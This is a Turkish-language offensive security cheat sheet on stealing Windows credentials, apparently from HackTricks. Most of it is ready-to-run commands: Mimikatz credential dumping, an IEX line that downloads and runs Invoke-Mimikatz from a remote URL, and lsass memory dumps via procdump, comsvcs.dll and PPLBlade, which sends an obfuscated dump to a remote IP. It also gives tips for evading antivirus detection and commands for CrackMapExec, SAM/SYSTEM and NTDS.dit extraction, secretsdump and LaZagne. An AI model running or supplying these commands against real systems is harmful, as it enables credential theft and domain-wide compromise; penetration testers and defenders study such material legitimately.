# Windows Kimlik Bilgilerini Çalma

{{#include ../../banners/hacktricks-training.md}}

## Kimlik Bilgileri Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz'in yapabileceği diğer şeyleri** [**bu sayfada**](credentials-mimikatz.md)** bulun.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Burada bazı olası kimlik bilgisi korumalarını öğrenin.**](credentials-protections.md) **Bu korumalar, Mimikatz'ın bazı kimlik bilgilerini çıkarmasını engelleyebilir.**

## Meterpreter ile Kimlik Bilgileri

Kurbanın içinde **şifreler ve hash'ler** aramak için oluşturduğum [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)'i kullanın.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV'yi Atlatma

### Procdump + Mimikatz

**Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**, meşru bir Microsoft aracıdır**, Defender tarafından tespit edilmez.\
Bu aracı kullanarak **lsass sürecini dökebilir**, **dökümü indirebilir** ve **dökümden** **kimlik bilgilerini yerel olarak çıkarabilirsiniz**.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Bu işlem otomatik olarak [SprayKatz](https://github.com/aas-n/spraykatz) ile yapılır: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Not**: Bazı **AV** **procdump.exe'nin lsass.exe'yi dökümlemesi** işlemini **kötü amaçlı** olarak **tespit** edebilir, bu da **"procdump.exe" ve "lsass.exe"** dizelerini **tespit** ettikleri içindir. Bu nedenle, procdump'a lsass.exe'nin **adı yerine** lsass.exe'nin **PID'sini** **argüman** olarak **geçmek** daha **gizli**dir. 

### **comsvcs.dll** ile lsass'ı dökme

`C:\Windows\System32` içinde bulunan **comsvcs.dll** adlı bir DLL, bir çökme durumunda **işlem belleğini dökmekten** sorumludur. Bu DLL, `rundll32.exe` kullanılarak çağrılmak üzere tasarlanmış **`MiniDumpW`** adlı bir **fonksiyon** içerir.\
İlk iki argümanı kullanmak önemsizdir, ancak üçüncü argüman üç bileşene ayrılır. Dökülecek işlem kimliği ilk bileşeni oluşturur, döküm dosyası konumu ikinciyi temsil eder ve üçüncü bileşen kesinlikle **full** kelimesidir. Alternatif seçenek yoktur.\
Bu üç bileşen ayrıştırıldığında, DLL döküm dosyasını oluşturmakta ve belirtilen işlemin belleğini bu dosyaya aktarmaktadır.\
**comsvcs.dll** kullanımı, lsass işlemini dökmek için mümkündür, böylece procdump'ı yükleyip çalıştırma ihtiyacı ortadan kalkar. Bu yöntem [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) adresinde ayrıntılı olarak açıklanmıştır.

Aşağıdaki komut yürütme için kullanılır:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Bu süreci** [**lssasy**](https://github.com/Hackndo/lsassy)** ile otomatikleştirebilirsiniz.**

### **Görev Yöneticisi ile lsass Dökümü**

1. Görev Çubuğuna sağ tıklayın ve Görev Yöneticisi'ni tıklayın
2. Daha fazla ayrıntı'ya tıklayın
3. İşlemler sekmesinde "Yerel Güvenlik Otoritesi Süreci" işlemini arayın
4. "Yerel Güvenlik Otoritesi Süreci" işlemine sağ tıklayın ve "Döküm dosyası oluştur" seçeneğine tıklayın.

### Procdump ile lsass Dökümü

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketinin bir parçası olan Microsoft imzalı bir ikilidir.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass with PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) Korunan Süreç Döküm Aracı, bellek dökümünü obfuscate etme ve bunu uzaktaki iş istasyonlarına disk üzerine bırakmadan aktarma desteği sunar.

**Ana işlevler**:

1. PPL korumasını aşma
2. Defender imza tabanlı tespit mekanizmalarından kaçınmak için bellek döküm dosyalarını obfuscate etme
3. Bellek dökümünü RAW ve SMB yükleme yöntemleriyle disk üzerine bırakmadan (dosyasız döküm) yükleme
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## CrackMapExec

### SAM hash'lerini dökme
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA sırlarını dökme
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Hedef DC'den NTDS.dit'i Dökme
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Hedef DC'den NTDS.dit şifre geçmişini dökme
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Her NTDS.dit hesabı için pwdLastSet niteliğini gösterin
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM & SYSTEM Çalma

Bu dosyalar _C:\windows\system32\config\SAM_ ve _C:\windows\system32\config\SYSTEM_ içinde **bulunmalıdır**. Ancak **bunları sıradan bir şekilde kopyalayamazsınız** çünkü korunmaktadırlar.

### Kayıt Defterinden

Bu dosyaları çalmanın en kolay yolu, kayıt defterinden bir kopya almaktır:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Bu dosyaları** Kali makinenize **indirin** ve **hash'leri çıkartmak için**:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Hacim Gölgesi Kopyası

Bu hizmeti kullanarak korunan dosyaların kopyasını alabilirsiniz. Yönetici olmanız gerekir.

#### vssadmin Kullanarak

vssadmin ikili dosyası yalnızca Windows Server sürümlerinde mevcuttur.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ama bunu **Powershell** ile de yapabilirsiniz. Bu, **SAM dosyasını kopyalama** örneğidir (kullanılan sabit disk "C:" ve C:\users\Public'e kaydediliyor) ancak bunu herhangi bir korumalı dosyayı kopyalamak için de kullanabilirsiniz:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Son olarak, SAM, SYSTEM ve ntds.dit dosyalarının bir kopyasını oluşturmak için [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) kullanabilirsiniz.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Kimlik Bilgileri - NTDS.dit**

**NTDS.dit** dosyası, **Active Directory**'nin kalbi olarak bilinir ve kullanıcı nesneleri, gruplar ve bunların üyelikleri hakkında kritik verileri tutar. Bu dosya, etki alanı kullanıcıları için **şifre hash'lerini** depolar. Bu dosya, **Genişletilebilir Depolama Motoru (ESE)** veritabanıdır ve **_%SystemRoom%/NTDS/ntds.dit_** konumunda bulunur.

Bu veritabanında üç ana tablo bulunmaktadır:

- **Veri Tablosu**: Bu tablo, kullanıcılar ve gruplar gibi nesneler hakkında ayrıntıları depolamakla görevlidir.
- **Bağlantı Tablosu**: Grup üyelikleri gibi ilişkileri takip eder.
- **SD Tablosu**: Her nesne için **Güvenlik tanımlayıcıları** burada tutulur ve depolanan nesnelerin güvenliği ve erişim kontrolünü sağlar.

Bunun hakkında daha fazla bilgi: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows, bu dosyayla etkileşimde bulunmak için _Ntdsa.dll_ kullanır ve _lsass.exe_ tarafından kullanılır. Ardından, **NTDS.dit** dosyasının bir kısmı **`lsass`** belleği içinde bulunabilir (performans iyileştirmesi nedeniyle muhtemelen en son erişilen verileri bulabilirsiniz, çünkü bir **önbellek** kullanılır).

#### NTDS.dit içindeki hash'leri çözme

Hash, 3 kez şifrelenmiştir:

1. **BOOTKEY** ve **RC4** kullanarak Şifre Çözme Anahtarını (**PEK**) çözün.
2. **PEK** ve **RC4** kullanarak **hash**'i çözün.
3. **DES** kullanarak **hash**'i çözün.

**PEK**, **her etki alanı denetleyicisinde** **aynı değere** sahiptir, ancak **etki alanı denetleyicisinin SYSTEM dosyasının BOOTKEY**'i kullanılarak **NTDS.dit** dosyası içinde **şifrelenmiştir** (etki alanı denetleyicileri arasında farklıdır). Bu nedenle, NTDS.dit dosyasından kimlik bilgilerini almak için **NTDS.dit ve SYSTEM dosyalarına** ihtiyacınız vardır (_C:\Windows\System32\config\SYSTEM_).

### Ntdsutil kullanarak NTDS.dit kopyalama

Windows Server 2008'den beri mevcuttur.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Ayrıca **ntds.dit** dosyasını kopyalamak için [**volume shadow copy**](./#stealing-sam-and-system) hilesini de kullanabilirsiniz. **SYSTEM file** dosyasının bir kopyasına da ihtiyacınız olacağını unutmayın (yine, [**dump it from the registry or use the volume shadow copy**](./#stealing-sam-and-system) hilesini kullanın).

### **NTDS.dit'ten hash'leri çıkarmak**

**NTDS.dit** ve **SYSTEM** dosyalarını **edindiğinizde**, _secretsdump.py_ gibi araçları kullanarak **hash'leri çıkartabilirsiniz**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Ayrıca geçerli bir alan yöneticisi kullanıcısı kullanarak **otomatik olarak çıkarabilirsiniz**:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Büyük **NTDS.dit dosyaları** için, [gosecretsdump](https://github.com/c-sto/gosecretsdump) kullanarak çıkartılması önerilir.

Son olarak, **metasploit modülünü** de kullanabilirsiniz: _post/windows/gather/credentials/domain_hashdump_ veya **mimikatz** `lsadump::lsa /inject`

### **NTDS.dit'ten bir SQLite veritabanına alan nesnelerini çıkartma**

NTDS nesneleri, [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) ile bir SQLite veritabanına çıkartılabilir. Sadece gizli bilgiler değil, aynı zamanda ham NTDS.dit dosyası zaten alındığında daha fazla bilgi çıkartma için tüm nesneler ve nitelikleri de çıkartılır.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hivesi isteğe bağlıdır ancak gizli bilgilerin şifre çözümlemesine izin verir (NT & LM hash'leri, düz metin şifreler, kerberos veya güven ilişkisi anahtarları, NT & LM şifre geçmişleri gibi ek kimlik bilgileri). Diğer bilgilerle birlikte, aşağıdaki veriler çıkarılır: kullanıcı ve makine hesapları ile hash'leri, UAC bayrakları, son oturum açma ve şifre değiştirme zaman damgası, hesap açıklamaları, adlar, UPN, SPN, gruplar ve özyinelemeli üyelikler, organizasyonel birim ağacı ve üyelik, güvenilir alanlar ile güven ilişkisi türü, yönü ve nitelikleri...

## Lazagne

Binariesi [buradan](https://github.com/AlessandroZ/LaZagne/releases) indirin. Bu binary'i çeşitli yazılımlardan kimlik bilgilerini çıkarmak için kullanabilirsiniz.
```
lazagne.exe all
```
## SAM ve LSASS'tan kimlik bilgilerini çıkarmak için diğer araçlar

### Windows credentials Editor (WCE)

Bu araç, bellekten kimlik bilgilerini çıkarmak için kullanılabilir. Şuradan indirebilirsiniz: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM dosyasından kimlik bilgilerini çıkarın.
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM dosyasından kimlik bilgilerini çıkarın
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Şuradan indirin: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) ve sadece **çalıştırın**, şifreler çıkarılacaktır.

## Defenses

[**Burada bazı kimlik bilgisi korumaları hakkında bilgi edinin.**](credentials-protections.md)

{{#include ../../banners/hacktricks-training.md}}
